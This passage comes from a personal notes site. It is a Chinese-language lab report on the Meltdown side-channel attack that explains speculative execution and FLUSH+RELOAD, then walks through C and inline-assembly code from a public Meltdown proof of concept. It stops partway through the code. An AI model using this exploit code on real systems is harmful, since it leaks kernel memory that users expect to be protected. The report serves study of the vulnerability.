@@ -1,0 +1,1198 @@
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Welcome to Allen Hong's Notes. This site records some of my notes. Hope it can help you a bit. You're also welcome to discuss with me and help point out some of this site's issues.">
+      
+      
+        <meta name="author" content="Allen Hong">
+      
+      
+        <link rel="canonical" href="https://masterallen.github.io/%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/meltdown/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">
+      
+      
+        <link rel="prev" href="../../compilebackdoor/%E7%BB%99%E7%BC%96%E8%AF%91%E5%99%A8%E5%8A%A0%E5%90%8E%E9%97%A8/">
+      
+      
+        <link rel="next" href="../../pwnable_kr/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="zensical-0.0.40">
+    
+    
+      
+        <title>meltdown 侧信道攻击实验报告 - Allen Hong's Notes</title>
+      
+    
+    
+      
+        
+      
+      <link rel="stylesheet" href="../../../../assets/stylesheets/modern/main.fba56155.min.css">
+      
+        
+          
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/modern/palette.dfe2e883.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+    
+    
+      <link rel="stylesheet" href="../../../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="https://unpkg.com/katex@0/dist/katex.min.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_scope.pathname.endsWith("/")||(__md_scope=new URL(__md_scope.pathname+"/",location)),__md_hash=e=>[...e].reduce(((e,t)=>(e<<5)-e+t.charCodeAt(0)),0),__md_get=(e,t=localStorage,_=__md_scope)=>JSON.parse(t.getItem(_.pathname+"."+e)),__md_set=(e,t,_=localStorage,a=__md_scope)=>{try{_.setItem(a.pathname+"."+e,JSON.stringify(t))}catch(e){}},document.documentElement.setAttribute("data-platform",navigator.platform)</script>
+    
+      
+  
+
+
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-WSXPFTNRTD"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-WSXPFTNRTD",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-WSXPFTNRTD",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+  
+    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
+  
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer" aria-label="Navigation"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#meltdown" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../.." title="Allen Hong&#x27;s Notes" class="md-header__button md-logo" aria-label="Allen Hong's Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer" aria-label="Navigation">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-menu" viewBox="0 0 24 24"><path d="M4 5h16M4 12h16M4 19h16"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Allen Hong's Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              meltdown 侧信道攻击实验报告
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="none" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="indigo"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search" aria-label="Search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-search" viewBox="0 0 24 24"><path d="m21 21-4.34-4.34"/><circle cx="11" cy="11" r="8"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog" aria-label="Search">
+  <button type="button" class="md-search__button">
+    Search
+  </button>
+</div>
+      
+    
+    <div class="md-header__source">
+      
+        <a href="https://github.com/masterAllen" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2026 Fonticons, Inc.--><path fill="currentColor" d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    My Github Link
+  </div>
+</a>
+      
+    </div>
+  </nav>
+  
+</header>
+    
+    
+    <div class="custom-sidebar-shell custom-page-shell md-grid">
+        
+          
+            
+            <div class="md-sidebar md-sidebar--primary" data-md-type="navigation" >
+              <div class="md-sidebar__scrollwrap">
+                <div class="md-sidebar__inner">
+                  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<div data-shared-navigation="../../../../navigation/shared/group-2-d7abe878c55d.html" data-site-root="../../../../" aria-busy="true">
+  <a href="../../../..">加载栏目目录…</a>
+</div>
+<script src="../../../../javascripts/shared-navigation.js"></script>
+
+<script src="../../../../javascripts/sidebar-title-tooltip.js"></script>
+<script src="../../../../javascripts/sidebar-scroll-position.js"></script>
+                </div>
+              </div>
+            </div>
+          
+        
+    </div>
+    
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+    <div class="md-container" data-md-component="container"
+         data-shared-navigation-target="../../../../navigation/shared/group-2-d7abe878c55d.html"
+         data-site-root="../../../../"
+         data-navigation-hidden="false">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../Main/" class="md-tabs__link">
+          
+  
+  Main
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../" class="md-tabs__link">
+          
+  
+  系统性知识
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../%E4%B9%A6%E7%B1%8D%E8%AE%B0%E5%BD%95/" class="md-tabs__link">
+          
+  
+  书籍记录
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../%E7%AE%97%E6%B3%95%E8%AE%B0%E5%BD%95/" class="md-tabs__link">
+          
+  
+  算法记录
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../CheatSheet/" class="md-tabs__link">
+          
+  
+  CheatSheet
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../Language/" class="md-tabs__link">
+          
+  
+  Language
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../Vision/CMOS%E7%9A%84%E7%90%86%E8%A7%A3/01.CMOS%E5%92%8CCCD%E7%A9%B6%E7%AB%9F%E5%8C%BA%E5%88%AB%E5%9C%A8%E5%93%AA%E9%87%8C/" class="md-tabs__link">
+          
+  
+  Vision
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../IP%E5%9C%B0%E7%90%86%E5%AE%9A%E4%BD%8D/%E6%95%B4%E4%BD%93%E7%9B%AE%E5%BD%95%E6%A0%91/" class="md-tabs__link">
+          
+  
+  IP 地理定位
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../About/" class="md-tabs__link">
+          
+  
+  About
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../%E5%BD%92%E6%A1%A3/%E4%BF%AE%E6%94%B9%E6%97%B6%E9%97%B4/" class="md-tabs__link">
+          
+  
+  归档
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <div class="custom-page-shell md-grid">
+        <div class="custom-main-area">
+          <main class="md-main" data-md-component="main">
+            <div class="md-main__inner md-grid">
+              
+                
+                  
+                  <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                    <div class="md-sidebar__scrollwrap">
+                      
+                        
+                        
+                        
+                          
+                        
+                        
+                          <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+                          <div class="md-sidebar-button__wrapper">
+                            <label class="md-sidebar-button" for="__toc"></label>
+                          </div>
+                        
+                      
+                      <div class="md-sidebar__inner">
+                        
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        攻击原理
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        攻击方法
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="攻击方法">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        攻击流程
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="攻击流程">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cache" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        清除 cache 内容
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cache_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        数据放入 cache
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        获取访问数据时间
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        推断访问数据
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        整体逻辑
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        其他注意点
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="其他注意点">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        处理异常
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        设定时间阈值
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        攻击结果
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                      </div>
+                    </div>
+                  </div>
+                
+              
+              
+                <div class="md-content" data-md-component="content">
+                  
+                    
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="Navigation" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../../../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    欢迎
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    系统性知识
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../compilebackdoor/%E7%BB%99%E7%BC%96%E8%AF%91%E5%99%A8%E5%8A%A0%E5%90%8E%E9%97%A8/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    信息安全
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="././" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    meltdown
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+                  
+                  <article class="md-content__inner md-typeset">
+                    
+                      
+                        
+  
+  
+
+
+<h1 id="meltdown">meltdown 侧信道攻击实验报告</h1>
+<div class="file-actions" data-image-edit-revision="b47128db57d0726af415100c49af1220ac10dba46d34b06a0e9aeef218be9dd5" data-title-link="true"><a href="blog-edit://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cmeltdown%5C%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.md" class="file-action-link" title="使用本地应用打开源文件">本地编辑</a> | <a href="blog-folder://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cmeltdown" class="file-action-link" title="使用文件资源管理器打开源文件所在目录">打开本地目录</a> | <span class="file-action-link" style="cursor: pointer;" data-copy="D:\Blog\done\系统性知识\信息安全\meltdown\实验报告.md">复制路径</span></div>
+
+<p>研究生一门课的一个作业。Meltdown 漏洞是一个很著名的漏洞，利用了缓存延时，很精妙。</p>
+<h2 id="_1">攻击原理</h2>
+<p>正常情况下，用户程序访问内核地址会因为权限问题触发异常，从而无法达到目的。比如汇编语句 <code>mov rax, byte [xxx]</code>，当 xxx 是内核地址时，用户执行这条指令会被 CPU 标记为非法，触发异常后会把 <code>rax</code> 清零。所以即使忽略掉异常，后续指令仍然无法得到内核地址 xxx 的内容。</p>
+<p>上述的保护方式看起来十分坚固，但是 meltdown 攻击利用 CPU 会进行乱序执行的特点找到了突破口。如  C 语言语句 <code>char data = *(char*) xxx; variable = arrary[data * 4096]</code>，转换成如下汇编语句。</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-0-1"><span class="linenos" data-linenos="1 "></span><span class="n">mov</span><span class="w"> </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">byte</span><span class="w"> </span><span class="p">[</span><span class="n">xxx</span><span class="p">]</span><span class="w"> </span><span class="c1">// illegal</span>
+</span><span id="__span-0-2"><span class="linenos" data-linenos="2 "></span><span class="n">shl</span><span class="w"> </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="mh">0xC</span><span class="w"> </span><span class="c1">// rax * 4096</span>
+</span><span id="__span-0-3"><span class="linenos" data-linenos="3 "></span><span class="n">mov</span><span class="w"> </span><span class="n">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">rbx</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">rax</span><span class="p">]</span><span class="w"> </span><span class="c1">// rbx = array, rcx = variable</span>
+</span></code></pre></div>
+<p>CPU 乱序执行这段代码会让<strong>在第一条语句触发异常前，部分执行第二条、第三条语句</strong>。比如就有可能在触发异常前，CPU 已经计算好了 <code>rbx + rax*4096</code>，而这里的 <code>rax</code> 就是内核地址中的内容。但是异常触发后仍然是一切可利用的信息都会消失，比如上述语句中<code>rax</code> 和 <code>rbx</code> 都会被清零。</p>
+<p>但是实际上，并不是所有可利用的消息都被清除掉了：<strong>假如 <code>rbx + rax*4096</code> 这一地址不在 cache 中，那么 CPU 会将这一地址放入 cache，并且异常触发不会从 cache 中擦除！</strong></p>
+<p>因此可以通过 cache 进行信息泄露，具体方式是判断数据访问时间的长短。数据在和不在 cache 中，访问该数据的时间相对来说是有不少差别的。方法的具体名称叫做 FLUSH + RELOAD，具体做法如下。</p>
+<ol>
+<li>
+<p>先清除掉 cache 内容，确保 array 即 <code>rbx</code> 这一段内容都不在 cache 中</p>
+</li>
+<li>
+<p>执行上述的汇编语句，执行完后可以保证 <code>rbx + rax * 4096</code> 这段地址放入了 cache 中</p>
+</li>
+<li>
+<p>从 <code>rbx + 0*4096</code> 开始遍历整个 array，假如某个地址访问时间相对与其他地址时间较短，那么就可以推出 <code>rax</code> ，即内核地址内容</p>
+</li>
+</ol>
+<h2 id="_2">攻击方法</h2>
+<p><strong>本次攻击使用了该项目的代码：<a href="https://github.com/paboldin/meltdown-exploit">paboldin/meltdown-exploit: Meltdown Exploit PoC (github.com)</a></strong>。下面主要是对该项目的攻击代码进行分析。</p>
+<h3 id="_3">攻击流程</h3>
+<p>攻击流程分为清除 cache 内容，将数据放入 cache，获取访问数据时间，推断目标数据。最后对这几个部分进行汇总。</p>
+<h4 id="cache">清除 cache 内容</h4>
+<div class="language-cpp highlight"><pre><span></span><code><span id="__span-1-1"><span class="linenos" data-linenos="1 "></span><span class="kt">void</span><span class="w"> </span><span class="nf">clflush_target</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span id="__span-1-2"><span class="linenos" data-linenos="2 "></span><span class="p">{</span>
+</span><span id="__span-1-3"><span class="linenos" data-linenos="3 "></span><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">VARIANTS_READ</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span><span id="__span-1-4"><span class="linenos" data-linenos="4 "></span><span class="w">        </span><span class="n">_mm_clflush</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_array</span><span class="p">[</span><span class="n">i</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">TARGET_SIZE</span><span class="p">]);</span>
+</span><span id="__span-1-5"><span class="linenos" data-linenos="5 "></span><span class="p">}</span>
+</span></code></pre></div>
+<p>利用 <code>_mm_clflush</code> 即可实现该功能。</p>
+<h4 id="cache_1">数据放入 cache</h4>
+<div class="language-cpp highlight"><pre><span></span><code><span id="__span-2-1"><span class="linenos" data-linenos=" 1 "></span><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">__attribute__</span><span class="p">((</span><span class="n">noinline</span><span class="p">))</span><span class="w"> </span>
+</span><span id="__span-2-2"><span class="linenos" data-linenos=" 2 "></span><span class="n">speculate</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">addr</span><span class="p">)</span>
+</span><span id="__span-2-3"><span class="linenos" data-linenos=" 3 "></span><span class="p">{</span>
+</span><span id="__span-2-4"><span class="linenos" data-linenos=" 4 "></span><span class="w">    </span><span class="k">asm</span><span class="w"> </span><span class="k">volatile</span><span class="w"> </span><span class="p">(</span>
+</span><span id="__span-2-5"><span class="linenos" data-linenos=" 5 "></span><span class="w">        </span><span class="s">&quot;1:</span><span class="se">\n\t</span><span class="s">&quot;</span>
+</span><span id="__span-2-6"><span class="linenos" data-linenos=" 6 "></span>
+</span><span id="__span-2-7"><span class="linenos" data-linenos=" 7 "></span><span class="w">        </span><span class="s">&quot;.rept 300</span><span class="se">\n\t</span><span class="s">&quot;</span>
+</span><span id="__span-2-8"><span class="linenos" data-linenos=" 8 "></span><span class="w">        </span><span class="s">&quot;add $0x141, %%rax</span><span class="se">\n\t</span><span class="s">&quot;</span>
+</span><span id="__span-2-9"><span class="linenos" data-linenos=" 9 "></span><span class="w">        </span><span class="s">&quot;.endr</span><span class="se">\n\t</span><span class="s">&quot;</span>
+</span><span id="__span-2-10"><span class="linenos" data-linenos="10 "></span>
+</span><span id="__span-2-11"><span class="linenos" data-linenos="11 "></span><span class="w">        </span><span class="s">&quot;movzx (%[addr]), %%eax</span><span class="se">\n\t</span><span class="s">&quot;</span>
+</span><span id="__span-2-12"><span class="linenos" data-linenos="12 "></span><span class="w">        </span><span class="s">&quot;shl $12, %%rax</span><span class="se">\n\t</span><span class="s">&quot;</span>
+</span><span id="__span-2-13"><span class="linenos" data-linenos="13 "></span><span class="w">        </span><span class="s">&quot;jz 1b</span><span class="se">\n\t</span><span class="s">&quot;</span>
+</span><span id="__span-2-14"><span class="linenos" data-linenos="14 "></span><span class="w">        </span><span class="s">&quot;movzx (%[target], %%rax, 1), %%rbx</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span id="__span-2-15"><span class="linenos" data-linenos="15 "></span>
+</span><span id="__span-2-16"><span class="linenos" data-linenos="16 "></span><span class="w">        </span><span class="s">&quot;stopspeculate: </span><span class="se">\n\t</span><span class="s">&quot;</span>
+</span><span id="__span-2-17"><span class="linenos" data-linenos="17 "></span><span class="w">        </span><span class="s">&quot;nop</span><span class="se">\n\t</span><span class="s">&quot;</span>
+</span><span id="__span-2-18"><span class="linenos" data-linenos="18 "></span><span class="w">        </span><span class="o">:</span>
+</span><span id="__span-2-19"><span class="linenos" data-linenos="19 "></span><span class="w">        </span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="n">target</span><span class="p">]</span><span class="w"> </span><span class="s">&quot;r&quot;</span><span class="w"> </span><span class="p">(</span><span class="n">target_array</span><span class="p">),</span>
+</span><span id="__span-2-20"><span class="linenos" data-linenos="20 "></span><span class="w">          </span><span class="p">[</span><span class="n">addr</span><span class="p">]</span><span class="w"> </span><span class="s">&quot;r&quot;</span><span class="w"> </span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+</span><span id="__span-2-21"><span class="linenos" data-linenos="21 "></span><span class="w">        </span><span class="o">:</span><span class="w"> </span><span class="s">&quot;rax&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;rbx&quot;</span>
+</span><span id="__span-2-22"><span class="linenos" data-linenos="22 "></span><span class="w">    </span><span class="p">);</span>
+</span><span id="__span-2-23"><span class="linenos" data-linenos="23 "></span><span class="p">}</span>
+</span></code></pre></div>
+<ol>
+<li>第 11-14 行是攻击原理中所讲的代码，通过这段代码就可以让 <code>rbx + rax*4096</code> 这一块地址放入 cache 中。</li>
+<li>第 07-09 行是进行 300 次 <code>add rax, 0x141</code>，执行这段代码因为有依赖关系，所以会顺序执行。这样就确保执行第 11-14 行代码不会被前面的语句干扰到。</li>
+</ol>
+<h4 id="_4">获取访问数据时间</h4>
+<div class="language-cpp highlight"><pre><span></span><code><span id="__span-3-1"><span class="linenos" data-linenos=" 1 "></span><span class="k">static</span><span class="w"> </span><span class="kr">inline</span><span class="w"> </span><span class="kt">int</span>
+</span><span id="__span-3-2"><span class="linenos" data-linenos=" 2 "></span><span class="nf">get_access_time</span><span class="p">(</span><span class="k">volatile</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">addr</span><span class="p">)</span>
+</span><span id="__span-3-3"><span class="linenos" data-linenos=" 3 "></span><span class="p">{</span>
+</span><span id="__span-3-4"><span class="linenos" data-linenos=" 4 "></span><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">time1</span><span class="p">,</span><span class="w"> </span><span class="n">time2</span><span class="p">;</span>
+</span><span id="__span-3-5"><span class="linenos" data-linenos=" 5 "></span><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="n">junk</span><span class="p">;</span>
+</span><span id="__span-3-6"><span class="linenos" data-linenos=" 6 "></span><span class="w">    </span><span class="n">time1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__rdtscp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">junk</span><span class="p">);</span>
+</span><span id="__span-3-7"><span class="linenos" data-linenos=" 7 "></span><span class="w">    </span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="o">*</span><span class="w"> </span><span class="n">addr</span><span class="p">;</span>
+</span><span id="__span-3-8"><span class="linenos" data-linenos=" 8 "></span><span class="w">    </span><span class="n">time2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__rdtscp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">junk</span><span class="p">);</span>
+</span><span id="__span-3-9"><span class="linenos" data-linenos=" 9 "></span><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">time2</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">time1</span><span class="p">;</span>
+</span><span id="__span-3-10"><span class="linenos" data-linenos="10 "></span><span class="p">}</span>
+</span></code></pre></div>
+<p><code>rdtscp</code> 函数通常用来测量代码的执行时间。<code>rdtscp</code> 含义是 read TSC(Time Stamp Counter) 寄存器。TSC 寄存器在每个 CPU 时钟信号到来时加 1。通过这个指令，我们可以获得纳秒级别的时间精度。</p>
+<p>上述代码在执行两个 <code>rdtscp</code> 函数之间中把要访问的地址当成函数执行，从而可以得到访问目标地址所用的时间。</p>
+<h4 id="_5">推断访问数据</h4>
+<div class="language-cpp highlight"><pre><span></span><code><span id="__span-4-1"><span class="linenos" data-linenos=" 1 "></span><span class="kt">void</span><span class="w"> </span><span class="nf">check</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
